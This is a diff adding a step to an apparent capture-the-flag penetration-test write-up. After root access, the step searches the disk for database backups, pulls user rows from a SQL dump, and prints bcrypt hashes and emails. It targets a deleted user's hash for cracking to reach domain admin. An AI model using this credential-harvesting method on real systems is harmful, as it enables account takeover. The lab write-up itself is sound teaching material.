@@ -3735,6 +3735,72 @@ Two mitigations would each have broken the chain independently. Creating `/root/
 <br>
 </div>
 
+### #### 4.8 — Recover a deleted user hash from a database backup
+
+**Why this step:** The live users table showed a gap at `id = 2`, indicating a deleted row. Root access permits reading files unavailable to lower-privileged accounts, including database backups predating the deletion.
+
+**Commands:**
+
+```bash
+id; hostname; ls -la /root/
+```
+
+```bash
+find / -name "*.sql*" -o -name "*.bak" -o -name "*.dump" 2>/dev/null | grep -v -E '/proc|/sys|node_modules' | head -20
+```
+
+```bash
+grep -iA5 'INSERT INTO `users`' /root/darkzero_campaigns_backup.sql | head -20
+```
+
+**Breakdown:**
+
+|Component|Purpose|Simple Explanation|
+|---|---|---|
+|`find / -name "*.sql*" -o -name "*.bak" -o -name "*.dump"`|Search the filesystem for backup artefacts|Look for database dumps anywhere on disk|
+|`grep -v -E '/proc\|/sys\|node_modules'`|Exclude virtual filesystems and dependency trees|Filter out noise|
+|`grep -iA5 'INSERT INTO \`users`'`|Match the users table insert, showing 5 following lines|Pull the user rows out of the dump|
+
+**Result — root's home directory:**
+
+```
+lrwxrwxrwx  1 root root     9 May 20 10:33 .bash_history -> /dev/null
+-rw-r--r--  1 root root 13451 May 20 10:05 darkzero_campaigns_backup.sql
+lrwxrwxrwx  1 root root     9 May 19 14:37 .mysql_history -> /dev/null
+drwx------  2 root root  4096 May 20 11:13 .ssh
+```
+
+**Result — backup contents:**
+
+sql
+
+```sql
+INSERT INTO `users` VALUES (1,'admin@dzcampaigns.htb','admin','$2b$10$HDdWzYvp1IWFD9TB4JsuCerlh.vKchv/LmBruCmKGH19hPP7IXvjm','admin','2026-04-19 15:34:56');
+INSERT INTO `users` VALUES (2,'celia.p@dzcampaigns.htb','celia','$2b$10$2L.IKTOkBtwtWuKcAF/VJ.kUKiBHLQ8hPeg2KYJJXFOUdga2iLsoC','player','2026-04-20 17:20:14');
+INSERT INTO `users` VALUES (3,'jerry.ap@dzcampaigns.htb','jerry','$2b$10$otSLTatDHIAAp3H58YYaTOgdhMlpbWBTEq1.MWFq5se6OOG3nV2Wy','player','2026-04-20 17:27:37');
+```
+
+**What this gives you:** A password hash for an account that no longer exists in the live database.
+
+**Comparison — live table versus backup:**
+
+|id|Live database (3.6)|Backup (May 20)|Status|
+|---|---|---|---|
+|1|`admin`|`admin`|Unchanged|
+|2|_(absent)_|**`celia`**|**Deleted from live — recovered here**|
+|3|`josh`|`jerry`|Replaced|
+|4|_(our account)_|_(absent)_|Created during this engagement|
+
+**Key findings:**
+
+- **`celia`'s bcrypt hash recovered: `$2b$10$2L.IKTOkBtwtWuKcAF/VJ.kUKiBHLQ8hPeg2KYJJXFOUdga2iLsoC`**, email `celia.p@dzcampaigns.htb`. This row was deleted from the production database and exists only in the backup.
+- The gap at `id = 2` observed during the original table dump was the indicator. Sequential primary keys with missing values signal deleted records, and backups are where those records survive.
+- The backup is readable only by root (`-rw-r--r--` in `/root`, a `0700` directory). Every prior account on this host was blocked from it; root access was the prerequisite.
+- Row 3 differs between backup and live: the backup holds `jerry`, the live table holds `josh`. Seed data was reworked after May 20. `jerry`'s hash is also recoverable but is lower priority.
+- `.bash_history` and `.mysql_history` in `/root` are both symlinked to `/dev/null`, so no command history is available.
+- Reference material for this target describes locating a SQL backup containing celia's deleted row and identifies celia as a member of Domain Admins in `darkzero.ext`. If that holds here, cracking this hash yields domain administrator credentials.
+
+**Next:** Crack celia's hash and verify her group memberships in the directory.
 <div align="center">
 <br>
 <br>
